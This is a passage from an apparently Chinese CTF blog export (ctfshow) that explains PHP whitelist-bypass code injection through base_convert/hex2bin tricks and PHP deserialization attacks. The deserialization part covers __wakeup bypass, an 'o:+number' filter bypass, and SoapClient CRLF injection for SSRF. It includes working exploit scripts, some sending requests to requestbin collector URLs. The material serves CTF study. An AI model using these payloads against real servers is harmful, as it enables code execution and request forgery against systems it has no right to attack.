single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//帮你算出答案</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base_convert() 函数在任意进制之间转换数字</p><p>decbin() 函数把十进制转换为二进制</p><p>bindec() 把二进制转换为十进制</p><p>dechex() 把十进制转换为十六进制</p><p>decoct() 把十进制转换为八进制</p><p>hex2bin() 把十六进制值转换为 ASCII 字符</p><h4 id="base-convert-number-frombase-tobase"><a href="#base-convert-number-frombase-tobase" class="headerlink" title="base_convert(number,frombase,tobase);"></a>base_convert(<em>number,frombase,tobase</em>);</h4><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>number</em></td><td align="left">必需。规定要转换的数。</td></tr><tr><td align="left"><em>frombase</em></td><td align="left">必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</td></tr><tr><td align="left"><em>tobase</em></td><td align="left">必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</td></tr></tbody></table><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin()"></a>hex2bin()</h3><p>函数把十六进制值的字符串转换为 ASCII 字符。</p><p>因此可以使用base_convert(,10,36),使用数字构造成数字字母（36进制由数字和26个字母构成）</p><p>hex2bin() 可以生成所有ascii的值转化为字符串</p><p>利用动态函数调用的思路</p><p>$_GET<a href="$_GET%5Bacos%5D">abs</a> # 有一个80字符的长度限制 abs，acos是因为只能输入whitelist内的字符</p><p>↓</p><p>$_GET{abs}($_GET{acos}) # []被过滤使用{}代替</p><p>↓</p><p>进制转换构造_GET # _GET 10进制:1598506324 16进制5f474554但无法传入字母<br>dechex(1598506324) # 5f474554 → hex2bin(dechex(1598506324)) # _GET</p><p><img src="/images/image-20220808150728162-1662567433523.png" alt="image-20220808150728162"></p><p>base_convert(‘37907361743’,10,36)(dechex(1598506324)) # hex2bin无法传入用base_convert(‘37907361743’,10,36)代替</p><p><img src="/images/image-20220808151108843-1662567433523.png" alt="image-20220808151108843"></p><p>所以</p><p>$pi&#x3D;_GET</p><p>$$pi&#x3D;$_GET</p><p>[]可以是使用{}代替</p><p>最终payload</p><p><img src="/images/image-20220908003548938.png" alt="image-20220908003548938"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2022/09/08/fan-xu-lie-hua/"/>
      <url>/2022/09/08/fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">\1. __construct()，类的构造函数\2. __destruct()，类的析构函数 当某个对象成为垃圾或者当对象被显式销毁时执行\3. __call()，在对象中调用一个对象中不存在或被权限控制中的方法 __call($name,$arguments)\4. __callStatic()，用静态方式中调用一个不可访问方法时调用\5. __get()，获得一个类的成员变量时调用\6. __set()，设置一个类的成员变量时调用\7. __isset()，当对不可访问属性调用isset()或empty()时调用\8. __unset()，当对不可访问属性调用unset()时被调用。\9. __sleep()，执行serialize()时，先会调用这个函数\10. __wakeup()，执行unserialize()时，先会调用这个函数\11. __toString()，类被当成字符串时的回应方法\12. __invoke()， 当尝试以调用函数的方式调用一个对象时,__invoke() 方法会被自动调用\13. __set_state()，调用var_export()导出类时，此静态方法会被调用。\14. __clone()，当对象复制完成时调用\15. __autoload()，尝试加载未定义的类\16. __debugInfo()，打印所需调试信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="调用类名中的方法的方式"><a href="#调用类名中的方法的方式" class="headerlink" title="调用类名中的方法的方式"></a>调用类名中的方法的方式</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token constant">getFlag</span> <span class="token comment">//调用Test类中的getflag函数</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'getFlag'</span><span class="token punctuation">]</span> <span class="token comment">//配合call_user_func，即可调用Test类中的getflag函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="过滤O-数字"><a href="#过滤O-数字" class="headerlink" title="过滤O:数字"></a>过滤O:数字</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在使用<code>o:+数字：</code>绕过</p><p>当然还要注意，public和protected等等修饰符</p><h2 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h2><p> 该类[序列化]的中的成员数大于实际成员数，即可绕过 </p><h2 id="SoapCLient-CRLF"><a href="#SoapCLient-CRLF" class="headerlink" title="SoapCLient+CRLF"></a>SoapCLient+CRLF</h2><h3 id="CRLF注入攻击"><a href="#CRLF注入攻击" class="headerlink" title="CRLF注入攻击"></a>CRLF注入攻击</h3><p>CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p><h2 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h2><p>从上图可以看到，<code>SOAPAction</code>处可控，可以把<code>\x0d\x0a</code>注入到<code>SOAPAction</code>，POST请求的header就可以被控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string double-quoted-string">"bbb\r\n\r\nccc\r\n"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:5555/path'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220825182209060-1663348100897.png" alt="image-20220825182209060"></p><p><img src="/images/image-20220825182222996-1663348100898.png" alt="image-20220825182222996"></p><p>但<code>Content-Type</code>在<code>SOAPAction</code>的上面，就无法控制<code>Content-Typ</code>,也就不能控制POST的数据</p><p>在header里<code>User-Agent</code>在<code>Content-Type</code>前面</p><p><code>user_agent</code>同样可以注入<code>CRLF</code>，控制<code>Content-Type</code>的值</p><p>wupco</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1:5555/path'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'data=something'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Cookie: PHPSESSID=my_session'</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length: '</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span>      <span class="token operator">=></span> <span class="token string double-quoted-string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pic2.zhimg.com/80/v2-ce341b9af7492f3e748e6b2bd824f81d_720w.jpg" alt="img"></p><p><img src="https://pic4.zhimg.com/80/v2-26a39062ca3894305f3d710862eae1ff_720w.jpg" alt="img"></p><p> <strong><code>Deserialization + __call + SoapClient + CRLF = SSRF</code></strong> </p><h3 id="php内置类"><a href="#php内置类" class="headerlink" title="php内置类"></a>php内置类</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Exception::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringGenerator::__wakeupClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeupDateTime::__set_stateDateTimeImmutable::__wakeupDateTimeImmutable::__set_stateDateTimeZone::__wakeupDateTimeZone::__set_stateDateInterval::__wakeupDateInterval::__set_stateDatePeriod::__wakeupDatePeriod::__set_stateJsonException::__wakeupJsonException::__toStringLogicException::__wakeupLogicException::__toStringBadFunctionCallException::__wakeupBadFunctionCallException::__toStringBadMethodCallException::__wakeupBadMethodCallException::__toStringDomainException::__wakeupDomainException::__toStringInvalidArgumentException::__wakeupInvalidArgumentException::__toStringLengthException::__wakeupLengthException::__toStringOutOfRangeException::__wakeupOutOfRangeException::__toStringRuntimeException::__wakeupRuntimeException::__toStringOutOfBoundsException::__wakeupOutOfBoundsException::__toStringOverflowException::__wakeupOverflowException::__toStringRangeException::__wakeupRangeException::__toStringUnderflowException::__wakeupUnderflowException::__toStringUnexpectedValueException::__wakeupUnexpectedValueException::__toStringCachingIterator::__toStringRecursiveCachingIterator::__toStringSplFileInfo::__toStringDirectoryIterator::__toStringFilesystemIterator::__toStringRecursiveDirectoryIterator::__toStringGlobIterator::__toStringSplFileObject::__toStringSplTempFileObject::__toStringSplFixedArray::__wakeupReflectionException::__wakeupReflectionException::__toStringReflectionFunctionAbstract::__toStringReflectionFunction::__toStringReflectionParameter::__toStringReflectionType::__toStringReflectionNamedType::__toStringReflectionMethod::__toStringReflectionClass::__toStringReflectionObject::__toStringReflectionProperty::__toStringReflectionClassConstant::__toStringReflectionExtension::__toStringReflectionZendExtension::__toStringAssertionError::__wakeupAssertionError::__toStringDOMException::__wakeupDOMException::__toStringPDOException::__wakeupPDOException::__toStringPDO::__wakeupPDOStatement::__wakeupSimpleXMLElement::__toStringSimpleXMLIterator::__toStringCURLFile::__wakeupmysqli_sql_exception::__wakeupmysqli_sql_exception::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="组合攻击"><a href="#组合攻击" class="headerlink" title="组合攻击"></a>组合攻击</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://requestbin.net/r/1jm1cxz1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们看看结果，从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制,也就可以来执行我们想要的东西啦</p><p> <img src="http://img-blog.csdnimg.cn/20201203102433101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>另外一方面Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据，但是我们发现在header里User-Agent在Content-Type前面，所以可以配合它进行利用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://requestbin.net/r/xzlkkpxz'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=y4tacker'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length: '</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="http://img-blog.csdnimg.cn/20201203103835118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>从结果当中我们能看出成功了，下面进入本题</p><p>代码审计<br>首页</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Cookie: PHPSESSID=my_session'</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length: '</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span>      <span class="token operator">=></span> <span class="token string double-quoted-string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 